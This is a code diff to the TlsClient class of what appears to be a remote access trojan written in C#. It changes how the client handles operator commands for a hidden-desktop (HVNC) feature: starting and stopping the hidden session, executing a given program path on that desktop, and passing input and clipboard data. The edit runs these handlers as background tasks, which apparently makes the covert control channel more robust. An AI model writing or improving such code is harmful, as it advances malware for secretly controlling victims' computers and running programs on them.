@@ -252,12 +252,14 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.HvncStart:
-                    HvncFeature.Start(
-                        System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new(),
-                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
+                {
+                    var hvncStartCfg = System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new();
+                    _ = Task.Run(() => HvncFeature.Start(hvncStartCfg,
+                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct)));
                     break;
+                }
                 case PacketType.HvncStop:
-                    HvncFeature.Stop();
+                    _ = Task.Run(() => HvncFeature.Stop());
                     break;
                 case PacketType.HvncFrameAck:
                     HvncFeature.SignalAck();
@@ -266,10 +268,12 @@ internal class TlsClient : IDisposable
                     HvncFeature.HandleInput(packet.Data);
                     break;
                 case PacketType.HvncExec:
+                {
                     var hvncExec = System.Text.Json.JsonSerializer.Deserialize<HvncExecDataStub>(packet.Data, SeroJson.Default.HvncExecDataStub);
                     if (hvncExec != null && !string.IsNullOrWhiteSpace(hvncExec.Path))
-                        HvncFeature.ExecOnDesktop(hvncExec.Path);
+                        _ = Task.Run(() => HvncFeature.ExecOnDesktop(hvncExec.Path));
                     break;
+                }
                 case PacketType.HvncClipboard:
                     var hvncClip = System.Text.Json.JsonSerializer.Deserialize<HvncClipboardDataStub>(packet.Data, SeroJson.Default.HvncClipboardDataStub);
                     if (hvncClip != null)
